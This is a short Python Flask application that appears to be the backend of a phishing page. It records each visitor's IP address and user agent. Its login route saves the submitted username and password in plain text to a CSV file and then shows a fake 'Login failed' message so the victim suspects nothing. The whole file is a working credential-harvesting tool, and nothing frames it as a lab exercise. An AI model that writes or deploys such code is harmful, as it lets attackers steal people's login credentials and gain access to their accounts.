from flask import Flask, render_template, request
import csv
import datetime

app = Flask(__name__)

@app.route("/")
def home():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    log_visit(ip, ua)
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    log_credentials(username, password)
    return "<h3>Login failed. Please try again later.</h3>"

def log_visit(ip, user_agent):
    with open("logs.csv", "a") as f:
        writer = csv.writer(f)
        writer.writerow([datetime.datetime.now(), "Visit", ip, user_agent])

def log_credentials(username, password):
    with open("logs.csv", "a") as f:
        writer = csv.writer(f)
        writer.writerow([datetime.datetime.now(), "Credentials", username, password])

if __name__ == "__main__":
    app.run(port=5000)
